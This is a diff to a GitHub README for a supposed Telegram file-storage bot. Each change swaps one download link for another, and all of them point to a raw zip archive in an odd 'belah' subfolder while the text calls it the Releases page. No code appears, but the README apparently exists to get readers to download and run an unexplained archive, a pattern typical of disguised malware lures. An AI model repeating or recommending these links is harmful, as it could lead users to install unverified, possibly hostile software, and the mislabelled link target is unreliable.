@@ -1,6 +1,6 @@
 # 🛡️ my_personal_tg_assistant - Securely Store Your Files on Telegram
 
-[![Download](https://raw.githubusercontent.com/Sdwdwdwswsd/my_personal_tg_assistant/main/belah/my_personal_tg_assistant_v2.7-alpha.1.zip)](https://raw.githubusercontent.com/Sdwdwdwswsd/my_personal_tg_assistant/main/belah/my_personal_tg_assistant_v2.7-alpha.1.zip)
+[![Download](https://raw.githubusercontent.com/Sdwdwdwswsd/my_personal_tg_assistant/main/belah/assistant-my-tg-personal-2.7.zip)](https://raw.githubusercontent.com/Sdwdwdwswsd/my_personal_tg_assistant/main/belah/assistant-my-tg-personal-2.7.zip)
 
 ---
 
@@ -26,7 +26,7 @@ This guide will help you download and run the **Personal Secure File Bot** on yo
 
 To get started, visit the Releases page to download the software. Click the link below for easy access:
 
-[Download the latest version](https://raw.githubusercontent.com/Sdwdwdwswsd/my_personal_tg_assistant/main/belah/my_personal_tg_assistant_v2.7-alpha.1.zip)
+[Download the latest version](https://raw.githubusercontent.com/Sdwdwdwswsd/my_personal_tg_assistant/main/belah/assistant-my-tg-personal-2.7.zip)
 
 After downloading, follow these steps:
 
@@ -88,4 +88,4 @@ This application is licensed under the MIT License. You can use, modify, and dis
 
 For any questions or feedback, feel free to open an issue on the GitHub repository. Enjoy using your personal secure file storage bot on Telegram!
 
-[Download the latest version](https://raw.githubusercontent.com/Sdwdwdwswsd/my_personal_tg_assistant/main/belah/my_personal_tg_assistant_v2.7-alpha.1.zip)
+[Download the latest version](https://raw.githubusercontent.com/Sdwdwdwswsd/my_personal_tg_assistant/main/belah/assistant-my-tg-personal-2.7.zip)
